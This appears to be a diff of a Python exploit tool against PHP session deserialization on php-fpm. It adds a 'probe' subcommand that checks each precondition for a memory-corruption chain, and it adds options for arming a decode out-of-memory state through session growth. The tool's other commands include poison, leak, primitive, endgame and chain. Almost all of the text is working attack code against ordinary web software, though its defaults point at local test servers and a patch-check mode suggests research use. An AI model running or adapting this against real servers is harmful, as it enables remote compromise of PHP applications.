+    small POSTs; everything else is a handful of requests.
+    """
+    base = args.base
+    version = args.version
+    ok = True
+
+    def report(status: str, label: str, detail: str) -> None:
+        print(f"[{status}] {label:<10} {detail}")
+
+    print(f"[*] probing {base} as PHP {version}")
+
+    # ---- 1. version registry -------------------------------------------
+    try:
+        if registry.is_fixed(version):
+            report("-", "version",
+                   f"{version} is fixed ({registry.fixed_in(version)} ships "
+                   f"php_basic_early_rinit): the stale state is cleared")
+            ok = False
+        elif not registry.chain_applies(version):
+            report("-", "version",
+                   f"{version} is vulnerable but never freed the struct "
+                   f"(no php_session_cancel_decode): only 'poison' applies")
+            ok = False
+        else:
+            fixed = registry.fixed_in(version)
+            report("+", "version",
+                   f"{version} vulnerable" + (f" (fixed in {fixed})" if fixed
+                                              else " (never patched)"))
+    except registry.UnknownVersion as exc:
+        report("!", "version", str(exc))
+
+    target = Target(base)
+    app = Target(base + PATHS["app"])
+    sid = b"probe" + os.urandom(6).hex().encode("latin1")
+    ref_sid = b"probe" + os.urandom(6).hex().encode("latin1")
+
+    # ---- 2. accumulating endpoint (the growth arm's app operation) -----
+    grow_ok = False
+    try:
+        status, _headers, body = target.post_urlencoded(
+            {"k": "probe0", "v": "PRBMARK"}, cookie=_cookie(sid),
+            path=PATHS["grow"], timeout=60.0)
+        grow_ok = b"GROW_OK" in _dechunk(body)
+        report("+" if grow_ok else "-", "growth",
+               f"{PATHS['grow']} appends to the session" if grow_ok else
+               f"{PATHS['grow']} answered {status} without GROW_OK")
+    except OSError as exc:
+        report("-", "growth", f"{PATHS['grow']} unreachable ({exc})")
+    if not grow_ok:
+        ok = False
+
+    # ---- 3. session_start + reflection ---------------------------------
+    try:
+        _status, _headers, body = app.get(PATHS["app"], cookie=_cookie(sid),
+                                          timeout=60.0)
+        reflected = b"probe0\tPRBMARK" in _dechunk(body)
+        report("+" if reflected else "-", "app",
+               f"{PATHS['app']} starts the session and reflects values"
+               if reflected else
+               f"{PATHS['app']} did not reflect the planted value "
+               f"(needed for the HTTP leak; pass --chunk/--pie without it)")
+        ok = ok and reflected
+    except OSError as exc:
+        report("-", "app", f"{PATHS['app']} unreachable ({exc})")
+        ok = False
+
+    # ---- 4. reference-bearing session ----------------------------------
+    ref_ok = False
+    try:
+        target.post_urlencoded({"x": "1"}, cookie=_cookie(ref_sid),
+                               path=PATHS["ref"], timeout=60.0)
+        _status, _headers, body = app.get(PATHS["app"],
+                                          cookie=_cookie(ref_sid), timeout=60.0)
+        ref_ok = b"r\tx" in _dechunk(body)
+        report("+" if ref_ok else "-", "reference",
+               f"{PATHS['ref']} stores a reference (the R:N hook)"
+               if ref_ok else f"{PATHS['ref']} did not reflect a reference")
+    except OSError as exc:
+        report("-", "reference", f"{PATHS['ref']} unreachable ({exc})")
+    if not ref_ok:
+        ok = False
+
+    # ---- 5. the arm: can a decode OOM be reached here? ------------------
+    armed = False
+    if grow_ok:
+        print("[*] arm: trying a decode-side OOM (one amplified "
+              "session_decode, growth as fallback) ...")
+        armed = grow_until_armed(base)
+        report("+" if armed else "-", "arm",
+               "decode OOM reached: BG(unserialize) arms" if armed else
+               "no decode OOM reachable: the surface saves more than it "
+               "can decode (session.lazy_write=Off, a lower consumer "
+               "memory_limit, or a bigger --arm-body needed)")
+    else:
+        report("-", "arm", "skipped: no accumulating endpoint")
+    ok = ok and armed
+
+    # ---- 6. workers ----------------------------------------------------
+    report("=", "workers",
+           "not measurable over HTTP: pass --workers ~ pm.max_children "
+           "(default 5); the consume fans out over them")
+
+    if ok:
+        print("[+] every precondition holds: run 'no-oracle'")
+        return 0
+    print("[!] missing preconditions listed above")
+    return 1
 
 
 def cmd_poison(args) -> int:
@@ -1709,7 +2229,7 @@ def cmd_poison(args) -> int:
         return 1
     payload = args.payload.encode("latin1")
     progress_key = (getattr(args, "progress_key", None) or "pwn").encode("latin1")
-    builder = Target(args.builder)
+    builder = builder_target(args.builder)
     app = Target(args.base + PATHS["app"])
 
     parts = [
@@ -1746,7 +2266,7 @@ def cmd_poison(args) -> int:
 
 def cmd_chain(args) -> int:
     print(f"[*] chain: build sessions -> producer -> consumer ({args.phase} phase)")
-    builder = Target(args.builder)
+    builder = builder_target(args.builder)
     if not os.path.isfile(session_file(args.version, OOM_SID)):
         print("[*] build-oom")
         big_session_post(builder, OOM_SID, 4 << 20)
@@ -1793,7 +2313,7 @@ def cmd_patchcheck(args) -> int:
         builder_url = f"http://127.0.0.1:{ports[version][1]}"
         print(f"\n=== {version} ===")
         chain_t = Target(base)
-        builder = Target(builder_url)
+        builder = builder_target(builder_url)
         if not os.path.isfile(session_file(version, OOM_SID)):
             big_session_post(builder, OOM_SID, 4 << 20)
         # lifecycle
@@ -1819,7 +2339,33 @@ def cmd_patchcheck(args) -> int:
 def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__.splitlines()[1])
     parser.add_argument("--base", default="http://127.0.0.1:8110")
-    parser.add_argument("--builder", default="http://127.0.0.1:8111")
+    parser.add_argument("--builder", default=None,
+                        help="builder surface URL (default: same origin as "
+                             "--base, which selects the growth arm)")
+    parser.add_argument("--builder-prefix", default="",
+                        help="path prefix of the builder pool when both pools "
+                             "share one port, e.g. /b (single-origin classic mode)")
+    parser.add_argument("--arm-mode", choices=("auto", "builder", "growth"),
+                        default="auto",
+                        help="auto: growth when --builder is the same origin as "
+                             "--base without a prefix, builder otherwise")
+    parser.add_argument("--workers", type=int, default=5,
+                        help="arm/consume fan-out; matches pm.max_children=5 "
+                             "of a default php-fpm pool (use 1 only for a "
+                             "pinned single-worker pool)")
+    parser.add_argument("--grow-path", default=None,
+                        help="endpoint that appends POST k/v to the session "
+                             "(default /grow.php)")
+    parser.add_argument("--grow-chunk", type=int, default=0,
+                        help="bytes appended to the session per growth round "
+                             "(default 262144; keep below the target's "
+                             "client_max_body_size/3)")
+    parser.add_argument("--grow-max", type=int, default=0,
+                        help="growth rounds before the big-body probe (default 4000)")
+    parser.add_argument("--arm-body", type=int, default=0,
+                        help="body bytes of the OOM probe after a stalled "
+                             "growth (default 921600; must exceed "
+                             "--grow-chunk*2 + the growth body)")
     parser.add_argument("--version", default="8.4.26")
     parser.add_argument("--sid", default=OOM_SID.decode())
     parser.add_argument("--size", type=int, default=4 << 20)
@@ -1847,7 +2393,7 @@ def main() -> int:
     sub = parser.add_subparsers(dest="cmd", required=True)
     for name in ("lifecycle", "oracle", "build-oom", "build-ref", "producer",
                  "reclaim-probe", "primitive", "endgame", "chain", "patchcheck",
-                 "leak", "no-oracle", "calibrate", "poison"):
+                 "leak", "no-oracle", "calibrate", "poison", "probe"):
         subparser = sub.add_parser(name)
         if name == "no-oracle":
             subparser.add_argument(
@@ -1881,14 +2427,16 @@ def main() -> int:
             subparser.add_argument("--progress-key", default=None,
                                    help="PHP_SESSION_UPLOAD_PROGRESS value")
     args = parser.parse_args()
+    if not args.builder:
+        args.builder = args.base
     configure_paths(args)
     # PHP < 8.2 never frees the unserialize struct on the OOM bailout (no
     # php_session_cancel_decode), so there is nothing for these commands to
     # reclaim: use 'poison' against those builds.
     if args.cmd in ("leak", "primitive", "endgame", "chain", "calibrate",
                     "no-oracle") and not registry.chain_applies(args.version):
-        print(f"[!] {args.cmd} needs PHP >= 8.2: before that the bailout "
-              f"never frees the unserialize struct.")
+        print(f"[!] {args.cmd} needs PHP >= 8.0: older branches never "
+              f"reclaim the stale unserialize struct (no verified chain).")
         print("    Use 'poison' (session-file plant) against those builds.")
         return 1
     if getattr(args, "candidates", None):
@@ -1912,6 +2460,7 @@ def main() -> int:
         "no-oracle": cmd_no_oracle,
         "calibrate": cmd_calibrate,
         "poison": cmd_poison,
+        "probe": cmd_probe,
     }
     return dispatch[args.cmd](args)
 
